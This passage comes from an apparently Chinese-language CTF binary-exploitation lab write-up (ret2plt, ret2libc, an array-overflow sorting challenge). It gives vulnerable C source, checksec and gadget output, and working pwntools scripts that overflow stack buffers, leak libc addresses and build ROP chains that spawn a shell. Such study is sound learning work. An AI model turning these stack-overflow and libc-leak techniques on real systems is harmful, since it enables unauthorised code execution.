rax<br>ret<br>syscall<br></code></pre></td></tr></table></figure><p><strong>思路就是先写入&#x2F;bin&#x2F;sh字符，然后再进行系统调用</strong></p><h3 id="Lab-6"><a href="#Lab-6" class="headerlink" title="Lab_6"></a>Lab_6</h3><p><strong>ret2plt</strong></p><h4 id="checksec-5"><a href="#checksec-5" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_6/Lab 6$ checksec ret2plt<br>[*] &#x27;/mnt/d/copy/Lab_6/Lab 6/ret2plt&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro：-2"><a href="#IDA-Pro：-2" class="headerlink" title="IDA_Pro："></a>IDA_Pro：</h4><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  system(<span class="hljs-string">&quot;echo What is your name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;name, <span class="hljs-number">0x10u</span>LL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Say something: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>不存在其他函数</strong></p><h5 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">char</span> name[<span class="hljs-number">16</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>];<br>  system(<span class="hljs-string">&quot;echo What is your name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x10</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Say something: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x40</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>有明显的溢出漏洞</strong></p><h5 id="name-addr"><a href="#name-addr" class="headerlink" title="name_addr"></a>name_addr</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0000000000601070 name            db    ? ;               ; DATA XREF: main+55↑o<br></code></pre></td></tr></table></figure><h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_6/Lab 6$ ROPgadget --binary ret2plt --only &#x27;pop|ret&#x27; | grep rdi<br>0x0000000000400733 : pop rdi ; ret<br></code></pre></td></tr></table></figure><h4 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; info func<br>All defined functions:<br><br>Non-debugging symbols:<br>0x00000000004004e8  _init<br>0x0000000000400510  puts@plt<br>0x0000000000400520  system@plt<br>0x0000000000400530  read@plt<br>0x0000000000400540  setvbuf@plt<br>0x0000000000400550  _start<br>0x0000000000400580  _dl_relocate_static_pie<br>0x0000000000400590  deregister_tm_clones<br>0x00000000004005c0  register_tm_clones<br>0x0000000000400600  __do_global_dtors_aux<br>0x0000000000400630  frame_dummy<br>0x0000000000400637  main<br>0x00000000004006d0  __libc_csu_init<br>0x0000000000400740  __libc_csu_fini<br>0x0000000000400744  _fini<br></code></pre></td></tr></table></figure><h4 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(os = &#x27;linux&#x27; , arch = &#x27;amd64&#x27; , log_level = &#x27;debug&#x27;)<br>p = process(&#x27;./ret2plt&#x27;)<br>#p = remote(&#x27;210.30.97.133&#x27;,28016)<br><br>pop_rdi_ret = 0x0000000000400733<br>ret = 0x00000000004004fe<br>name_addr = 0x0000000000601070<br>system = 0x0000000000400520<br>offset = 0x10<br><br>py1 = b&#x27;/bin/sh&#x27;<br><br>p.recvuntil(b&#x27;?&#x27;)<br>p.send(py1)<br>#pause()<br><br>p.recvuntil(b&#x27;: \n&#x27;)<br>py2 = b&#x27;a&#x27; * ( offset + 0x8 ) + p64(pop_rdi_ret) + p64(name_addr) + p64(ret) + p64(system)<br>pause()<br>p.send(py2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后一个ret是用于栈对齐</p><h3 id="Lab-7"><a href="#Lab-7" class="headerlink" title="Lab_7"></a>Lab_7</h3><p><strong>ret2libc</strong></p><h4 id="checksec-6"><a href="#checksec-6" class="headerlink" title="checksec"></a>checksec</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_7/Lab 7$ checksec ret2libc<br>[*] &#x27;/mnt/d/copy/Lab_7/Lab 7/ret2libc&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro-3"><a href="#IDA-Pro-3" class="headerlink" title="IDA_Pro"></a>IDA_Pro</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  _QWORD *v6; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You have one chance to read the memory!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give me the address in hex: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x10u</span>LL);<br>  v6 = (_QWORD *)strtoll(buf, <span class="hljs-number">0LL</span>, <span class="hljs-number">16</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nContent: %lld\n&quot;</span>, *v6);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give me your messege: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, v4, <span class="hljs-number">0x90u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-type">char</span> addr[<span class="hljs-number">16</span>];<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have one chance to read the memory!\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give me the address in hex: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, addr, <span class="hljs-number">0x10</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> iaddr = strtoll(addr, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nContent: %lld\n&quot;</span>, *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *)iaddr);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Give me your messege: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x90</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>明显的溢出漏洞，长度充足</p><p><strong>溢出长度计算为0x30+0x08</strong></p><h4 id="ROPgadget-1"><a href="#ROPgadget-1" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_7/Lab 7$ ROPgadget --binary ret2libc --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;<br>0x00000000004007d3 : pop rdi ; ret<br></code></pre></td></tr></table></figure><h4 id="GDB-1"><a href="#GDB-1" class="headerlink" title="GDB"></a>GDB</h4><p><strong>可以用GDB调试确定溢出长度</strong></p><h4 id="exp：-2"><a href="#exp：-2" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context( os = &#x27;linux&#x27; , arch =&#x27;amd64&#x27; , log_level = &#x27;debug&#x27; )<br><br>libc = ELF(&#x27;./libc-2.23.so&#x27;)<br>#p = process(&#x27;./ret2libc&#x27;)<br>e = ELF(&#x27;./ret2libc&#x27;)<br>p = remote(&#x27;210.30.97.133&#x27;,28047)<br><br>#------------------------------------------<br>puts_got = 0x601018<br>pop_rdi = 0x00000000004007d3 #: pop rdi ; ret<br>#------------------------------------------<br>py1 = &#x27;0x601018&#x27;<br><br>p.recvuntil(b&#x27;Give me the address in hex: &#x27;)<br>p.send(py1)<br><br>p.recvuntil(b&#x27;Content: &#x27;)<br>puts_real_addr = int(p.recvuntil(b&#x27;\n&#x27;)[:-1])<br><br>print(puts_real_addr)<br><br>#-----------------------------------------<br>libc_base = puts_real_addr - libc.sym[&quot;puts&quot;]<br>system_addr = libc_base + libc.sym[&quot;system&quot;]<br>binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))<br>#-----------------------------------------<br>print(&quot;system_addr:&#123;&#125;&quot;.format(hex(system_addr)))<br>print(&quot;binsh_addr:&#123;&#125;&quot;.format(hex(binsh_addr)))<br>#打印地址确定是否真的泄露了<br>pause()<br>py2 = b&#x27;a&#x27;* ( 0x30 + 0x08 )<br>py2 += p64(pop_rdi)<br>py2 += p64(binsh_addr)<br>py2 += p64(system_addr)<br>p.recvuntil(b&#x27;Give me your messege: &#x27;)<br>p.send(py2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="exp2："><a href="#exp2：" class="headerlink" title="exp2："></a>exp2：</h4><p><strong>这个题目也可以用one_gadget来做</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3"><br></code></pre></td></tr></table></figure><h3 id="Lab-8"><a href="#Lab-8" class="headerlink" title="Lab_8"></a>Lab_8</h3><h4 id="checksec-7"><a href="#checksec-7" class="headerlink" title="checksec"></a>checksec</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_8/Lab 8$ checksec sort<br>[*] &#x27;/mnt/d/copy/Lab_8/Lab 8/sort&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro-4"><a href="#IDA-Pro-4" class="headerlink" title="IDA_Pro"></a>IDA_Pro</h4><p><strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-138B4h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-138B0h]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+14h] [rbp-138ACh]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+18h] [rbp-138A8h] BYREF</span><br>  __int64 base[<span class="hljs-number">10000</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-138A0h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+138A0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v10; <span class="hljs-comment">// [rsp+138B8h] [rbp-8h]</span><br><br>  v10 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the sorting service!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter array size (1~10000):&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v4);<span class="hljs-comment">//获取v4的值，为后续的循环次数</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter the array:&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v4; ++i )<br>  &#123;<br>    __isoc99_scanf(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;v7);<span class="hljs-comment">//接收数据</span><br>    <span class="hljs-keyword">if</span> ( v7 &gt;= <span class="hljs-number">0</span> )<span class="hljs-comment">//如果接受到的数据非负则存入对应的数组位置，但是貌似大小不匹配</span><br>      base[i] = v7;<br>  &#125;<br>  qsort(base, v4, <span class="hljs-number">8uLL</span>, comp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Here is the result&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v4; ++j )<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld &quot;</span>, base[j]);<br>  <span class="hljs-built_in">puts</span>(&amp;byte_BD4);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please leave your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x90u</span>LL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you for using our service!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>comp</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">comp</span><span class="hljs-params">(_QWORD *a1, _QWORD *a2)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( *a1 &gt; *a2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>  <span class="hljs-keyword">if</span> ( *a1 &gt;= *a2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFL</span>L;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">comp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *lhs, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *rhs)</span><br>&#123;<br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> f = *((<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)lhs);<br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> s = *((<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)rhs);<br>  <span class="hljs-keyword">if</span> (f &gt; s) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (f &lt; s) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//用于qsort排序</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置标准输入输出为无缓冲模式</span><br>  <span class="hljs-type">char</span> name[<span class="hljs-number">16</span>];<br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> arr[<span class="hljs-number">10000</span>];<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the sorting service!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter array size (1~10000):&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;size);<span class="hljs-comment">//为后续数组循环的大小，存在数组溢出</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please enter the array:&quot;</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> temp;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;temp);<br>    <span class="hljs-keyword">if</span> (temp &gt;= <span class="hljs-number">0</span>) &#123;<br>      arr[i] = temp;<br>    &#125;<br>  &#125;<span class="hljs-comment">//存入非负数</span><br>  qsort(arr, size, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span> <span class="hljs-type">long</span>), comp);<span class="hljs-comment">//快速排序</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Here is the result&quot;</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld &quot;</span>, arr[i]);<br>  &#125;<span class="hljs-comment">//打印排序结果</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please leave your name:&quot;</span>);<span class="hljs-comment">//输入名字，此处存在明显的栈溢出，溢出长度为0x90-0x18</span><br>  read(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x90</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you for using our service!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>看完后的第一反应觉得应该就是数组溢出泄露一些地址什么的然后确定libc_base，可能甚至要泄露canary的值，然后再伪造canary，最后构造rop链，或者one_gadget</strong>,最后发现也确实是这样</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python3"><br></code></pre></td></tr></table></figure><h2 id="散题"><a href="#散题" class="headerlink" title="散题"></a>散题</h2><h3 id="2025-4-18"><a href="#2025-4-18" class="headerlink" title="2025_4_18:"></a>2025_4_18:</h3><h4 id="checksec-8"><a href="#checksec-8" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/pwn_1$ checksec pwn<br>[*] &#x27;/mnt/d/copy/pwn_1/pwn&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    